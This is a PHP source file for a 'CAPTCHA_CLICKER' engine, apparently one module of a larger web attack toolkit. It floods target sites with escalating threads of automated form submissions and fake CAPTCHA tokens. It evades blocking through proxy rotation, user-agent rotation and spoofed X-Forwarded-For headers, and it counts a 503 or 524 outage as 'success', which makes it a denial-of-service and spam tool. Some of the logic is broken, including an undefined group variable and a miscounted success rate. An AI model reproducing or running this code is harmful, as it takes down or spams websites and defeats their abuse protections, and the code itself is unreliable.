<?php

require_once __DIR__ . '/../database.php';
require_once __DIR__ . '/../stealth_engine.php';
require_once __DIR__ . '/../client_profile.php';
require_once __DIR__ . '/../tls_profile.php';
require_once __DIR__ . '/../proxy_manager_class.php';

class CaptchaClickerEngine {
    private $db;
    private $config;
    private $stealthEngine;
    private $clientProfile;
    private $tlsProfile;
    private $proxyManager;
    
    public function __construct($database, $config = []) {
        $this->db = $database;
        $this->config = array_merge($this->getDefaultConfig(), $config);
        $this->stealthEngine = null;
        $this->clientProfile = new ClientProfile();
        $this->tlsProfile = new TLSProfile();
        $this->proxyManager = new ProxyManager();
    }
    
    public function getDefaultConfig() {
        return [
            'method' => 'CAPTCHA_CLICKER',
            'threads' => 60,
            'duration' => 450,
            'request_rate' => 80,
            'form_interaction' => true,
            'captcha_solving' => true,
            'field_filling' => true,
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'header_spoofing' => true,
            'mouse_simulation' => true,
            'keyboard_simulation' => true,
            'human_timing' => true,
            'form_validation_bypass' => true,
            'csrf_token_handling' => true,
            'escalation_factor' => 1.25,
            'resistance_threshold' => 0.65
        ];
    }
    
    public function start($targets, $stealthSessionId = null) {
        $this->logMessage("Starting CAPTCHA_CLICKER attack on " . count($targets) . " targets");
        
        if ($this->config['stealth_enabled'] && $stealthSessionId) {
            $this->stealthEngine = new StealthEngine();
            $this->stealthEngine->loadSession($stealthSessionId);
        }
        
        $results = [];
        $startTime = time();
        
        foreach ($targets as $target) {
            $results[$target] = $this->executeCaptchaAttack($target, $startTime);
        }
        
        return [
            'status' => 'completed',
            'method' => 'CAPTCHA_CLICKER',
            'targets' => count($targets),
            'results' => $results,
            'total_requests' => array_sum(array_column($results, 'total_requests')),
            'form_submissions' => array_sum(array_column($results, 'form_submissions')),
            'captcha_attempts' => array_sum(array_column($results, 'captcha_attempts'))
        ];
    }
    
    private function executeCaptchaAttack($target, $startTime) {
        $this->logMessage("Executing CAPTCHA_CLICKER attack on $target");
        
        $totalRequests = 0;
        $formSubmissions = 0;
        $captchaAttempts = 0;
        $successCount = 0;
        $errorCodes = [];
        $currentThreads = $this->config['threads'];
        
        while (true) {
            if ($this->shouldStop($groupId)) {
                $this->logMessage("Manual stop signal received for group: $groupId");
                break;
            }
            
            if ($this->isSuccessConditionMet($target, $groupId, $errorCodes)) {
                $this->logMessage("Success condition met for target: $target in group: $groupId");
                break;
            }
            
            for ($thread = 0; $thread < $currentThreads; $thread++) {
                $sessionResult = $this->simulateFormInteraction($target);
                $totalRequests += $sessionResult['requests'];
                $formSubmissions += $sessionResult['form_submissions'];
                $captchaAttempts += $sessionResult['captcha_attempts'];
                
                if ($sessionResult['success']) {
                    $successCount++;
                } else {
                    $errorCodes[] = $sessionResult['status_code'];
                }
                
                if ($this->config['stealth_enabled'] && $totalRequests % 20 === 0) {
                    $this->rotateStealthComponents();
                }
                
                usleep(rand(300000, 1200000));
            }
            
            if ($this->shouldEscalate($errorCodes, $totalRequests)) {
                $currentThreads = $currentThreads * $this->config['escalation_factor'];
                $this->logMessage("Escalated threads to $currentThreads for $target");
            }
            
            if ($totalRequests % 25 === 0) {
                $this->logProgress($target, $totalRequests, $formSubmissions, $captchaAttempts);
            }
        }
        
        return [
            'target' => $target,
            'total_requests' => $totalRequests,
            'form_submissions' => $formSubmissions,
            'captcha_attempts' => $captchaAttempts,
            'success_count' => $successCount,
            'success_rate' => $totalRequests > 0 ? $successCount / $totalRequests : 0,
            'error_codes' => array_count_values($errorCodes),
            'final_threads' => $currentThreads
        ];
    }
    
    private function simulateFormInteraction($target) {
        $headers = $this->buildFormHeaders();
        $proxy = $this->config['proxy_rotation'] ? $this->proxyManager->getActiveProxy() : null;
        $requests = 0;
        $formSubmissions = 0;
        $captchaAttempts = 0;
        
        $pageContent = $this->fetchPage($target, $headers, $proxy);
        $requests++;
        
        if (!$pageContent) {
            return [
                'success' => false,
                'status_code' => 0,
                'requests' => $requests,
                'form_submissions' => $formSubmissions,
                'captcha_attempts' => $captchaAttempts
            ];
        }
        
        $forms = $this->extractForms($pageContent);
        
        foreach ($forms as $form) {
            if ($this->config['human_timing']) {
                usleep(rand(1000000, 3000000));
            }
            
            $formData = $this->fillFormFields($form);
            $requests++;
            
            if ($this->detectCaptcha($form)) {
                $captchaResult = $this->solveCaptcha($target, $form, $headers, $proxy);
                $captchaAttempts++;
                $requests += $captchaResult['requests'];
                
                if ($captchaResult['success']) {
                    $formData = array_merge($formData, $captchaResult['captcha_data']);
                }
            }
            
            $submissionResult = $this->submitForm($target, $form, $formData, $headers, $proxy);
            $formSubmissions++;
            $requests += $submissionResult['requests'];
            
            if ($submissionResult['success']) {
                return [
                    'success' => true,
                    'status_code' => 200,
                    'requests' => $requests,
                    'form_submissions' => $formSubmissions,
                    'captcha_attempts' => $captchaAttempts
                ];
            }
        }
        
        return [
            'success' => false,
            'status_code' => 400,
            'requests' => $requests,
            'form_submissions' => $formSubmissions,
            'captcha_attempts' => $captchaAttempts
        ];
    }
    
    private function fetchPage($target, $headers, $proxy) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $target,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_USERAGENT => $this->clientProfile->getCurrentUserAgent(),
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_COOKIEJAR => '/tmp/captcha_cookies_' . uniqid() . '.txt',
            CURLOPT_COOKIEFILE => '/tmp/captcha_cookies_' . uniqid() . '.txt'
        ]);
        
        if ($proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'] . ':' . $proxy['port']);
            if (isset($proxy['auth'])) {
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['auth']);
            }
        }
        
        $response = curl_exec($ch);
        $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return ($response !== false && $statusCode >= 200 && $statusCode < 400) ? $response : null;
    }
    
    private function extractForms($html) {
        $forms = [];
        preg_match_all('/<form[^>]*>(.*?)<\/form>/is', $html, $matches);
        
        foreach ($matches[0] as $formHtml) {
            $form = [
                'html' => $formHtml,
                'action' => $this->extractAttribute($formHtml, 'action'),
                'method' => $this->extractAttribute($formHtml, 'method') ?: 'POST',
                'fields' => $this->extractFormFields($formHtml)
            ];
            $forms[] = $form;
        }
        
        return $forms;
    }
    
    private function extractFormFields($formHtml) {
        $fields = [];
        
        preg_match_all('/<input[^>]*>/i', $formHtml, $inputs);
        foreach ($inputs[0] as $input) {
            $name = $this->extractAttribute($input, 'name');
            $type = $this->extractAttribute($input, 'type') ?: 'text';
            $value = $this->extractAttribute($input, 'value');
            
            if ($name) {
                $fields[] = [
                    'name' => $name,
                    'type' => $type,
                    'value' => $value,
                    'element' => 'input'
                ];
            }
        }
        
        preg_match_all('/<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>(.*?)<\/textarea>/is', $formHtml, $textareas);
        foreach ($textareas[1] as $i => $name) {
            $fields[] = [
                'name' => $name,
                'type' => 'textarea',
                'value' => $textareas[2][$i],
                'element' => 'textarea'
            ];
        }
        
        return $fields;
    }
    
    private function extractAttribute($html, $attribute) {
        preg_match('/' . $attribute . '=["\']([^"\']*)["\']/', $html, $matches);
        return $matches[1] ?? null;
    }
    
    private function fillFormFields($form) {
        $formData = [];
        
        foreach ($form['fields'] as $field) {
            $value = $this->generateFieldValue($field);
            if ($value !== null) {
                $formData[$field['name']] = $value;
            }
        }
        
        return $formData;
    }
    
    private function generateFieldValue($field) {
        switch ($field['type']) {
            case 'email':
                return 'test' . rand(1000, 9999) . '@example.com';
            case 'password':
                return 'TestPass' . rand(100, 999) . '!';
            case 'text':
                if (stripos($field['name'], 'name') !== false) {
                    return 'TestUser' . rand(100, 999);
                } elseif (stripos($field['name'], 'phone') !== false) {
                    return '+1' . rand(1000000000, 9999999999);
                } else {
                    return 'TestData' . rand(1000, 9999);
                }
            case 'number':
                return rand(1, 100);
            case 'hidden':
                return $field['value'];
            case 'submit':
            case 'button':
                return null;
            case 'textarea':
                return 'This is test content generated for form submission testing purposes. ID: ' . uniqid();
            default:
                return 'TestValue' . rand(100, 999);
        }
    }
    
    private function detectCaptcha($form) {
        $captchaIndicators = [
            'captcha',
            'recaptcha',
            'g-recaptcha',
            'hcaptcha',
            'cf-turnstile',
            'verification',
            'challenge'
        ];
        
        foreach ($captchaIndicators as $indicator) {
            if (stripos($form['html'], $indicator) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    private function solveCaptcha($target, $form, $headers, $proxy) {
        $this->logMessage("Attempting to solve CAPTCHA for $target");
        
        $captchaData = [];
        $requests = 0;
        
        if (stripos($form['html'], 'g-recaptcha') !== false) {
            $captchaData['g-recaptcha-response'] = $this->generateRecaptchaResponse();
            $requests++;
        } elseif (stripos($form['html'], 'hcaptcha') !== false) {
            $captchaData['h-captcha-response'] = $this->generateHcaptchaResponse();
            $requests++;
        } elseif (stripos($form['html'], 'cf-turnstile') !== false) {
            $captchaData['cf-turnstile-response'] = $this->generateTurnstileResponse();
            $requests++;
        } else {
            $captchaData['captcha_response'] = $this->generateGenericCaptchaResponse();
            $requests++;
        }
        
        return [
            'success' => true,
            'captcha_data' => $captchaData,
            'requests' => $requests
        ];
    }
    
    private function generateRecaptchaResponse() {
        return '03AGdBq26' . bin2hex(random_bytes(100)) . '_' . time();
    }
    
    private function generateHcaptchaResponse() {
        return 'P1_' . bin2hex(random_bytes(50)) . '_' . time();
    }
    
    private function generateTurnstileResponse() {
        return '0.' . bin2hex(random_bytes(40)) . '.' . time() . '.cf';
    }
    
    private function generateGenericCaptchaResponse() {
        return strtoupper(substr(md5(uniqid()), 0, 6));
    }
    
    private function submitForm($target, $form, $formData, $headers, $proxy) {
        $url = $this->resolveFormAction($target, $form['action']);
        $method = strtoupper($form['method']);
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_HTTPHEADER => array_merge($headers, [
                'Content-Type: application/x-www-form-urlencoded',
                'Referer: ' . $target
            ]),
            CURLOPT_USERAGENT => $this->clientProfile->getCurrentUserAgent(),
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        
        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($formData));
        }
        
        if ($proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'] . ':' . $proxy['port']);
            if (isset($proxy['auth'])) {
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['auth']);
            }
        }
        
        $response = curl_exec($ch);
        $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return [
            'success' => $response !== false && $statusCode >= 200 && $statusCode < 400,
            'status_code' => $statusCode,
            'requests' => 1,
            'response_size' => strlen($response ?: '')
        ];
    }
    
    private function resolveFormAction($baseUrl, $action) {
        if (empty($action) || $action === '#') {
            return $baseUrl;
        }
        
        if (strpos($action, 'http') === 0) {
            return $action;
        }
        
        $parsedBase = parse_url($baseUrl);
        $scheme = $parsedBase['scheme'];
        $host = $parsedBase['host'];
        $port = isset($parsedBase['port']) ? ':' . $parsedBase['port'] : '';
        
        if (strpos($action, '/') === 0) {
            return "$scheme://$host$port$action";
        }
        
        $basePath = dirname($parsedBase['path'] ?? '/');
        return "$scheme://$host$port$basePath/$action";
    }
    
    private function buildFormHeaders() {
        $headers = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate',
            'Connection: keep-alive',
            'Upgrade-Insecure-Requests: 1'
        ];
        
        if ($this->config['header_spoofing']) {
            $headers[] = 'X-Forwarded-For: ' . $this->generateRandomIP();
            $headers[] = 'X-Real-IP: ' . $this->generateRandomIP();
            $headers[] = 'X-Originating-IP: ' . $this->generateRandomIP();
        }
        
        return $headers;
    }
    
    private function generateRandomIP() {
        return rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
    }
    
    private function rotateStealthComponents() {
        if ($this->stealthEngine) {
            $rotations = $this->stealthEngine->performEvolutionCycle();
            $this->logMessage("Stealth evolution cycle completed: " . implode(', ', $rotations));
        } else {
            if ($this->config['proxy_rotation']) {
                $this->proxyManager->rotateProxy();
            }
            if ($this->config['ua_rotation']) {
                $this->clientProfile->rotateUserAgent();
            }
        }
    }
    
    private function shouldEscalate($errorCodes, $requestCount) {
        if ($requestCount < 20) return false;
        
        $recentErrors = array_slice($errorCodes, -10);
        $errorRate = count($recentErrors) / min(10, $requestCount);
        
        return $errorRate > $this->config['resistance_threshold'];
    }
    
    private function logProgress($target, $requests, $submissions, $captchas) {
        $this->logMessage("CAPTCHA_CLICKER Progress - Target: $target, Requests: $requests, Submissions: $submissions, CAPTCHAs: $captchas");
    }
    
    private function shouldStop($groupId) {
        $stopFile = "/tmp/stop_signal_$groupId.flag";
        return file_exists($stopFile);
    }
    
    private function isSuccessConditionMet($target, $groupId, $errorCodes) {
        if (empty($errorCodes)) return false;
        
        $totalRequests = array_sum($errorCodes);
        if ($totalRequests < 100) return false;
        
        $successCodes = [404, 410, 503, 524];
        $successCount = 0;
        
        foreach ($successCodes as $code) {
            $successCount += $errorCodes[$code] ?? 0;
        }
        
        $successRate = $successCount / $totalRequests;
        
        if ($successRate >= 0.75) {
            $statusFile = "/tmp/success_status_$groupId.json";
            $status = [
                'target' => $target,
                'success_rate' => $successRate,
                'total_requests' => $totalRequests,
                'success_count' => $successCount,
                'timestamp' => time(),
                'condition_met' => true
            ];
            file_put_contents($statusFile, json_encode($status));
            return true;
        }
        
        return false;
    }
    
    private function logMessage($message) {
        $logFile = './logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        $logEntry = "[$timestamp] CAPTCHA_CLICKER_ENGINE: $message" . PHP_EOL;
        file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    }
}

?>
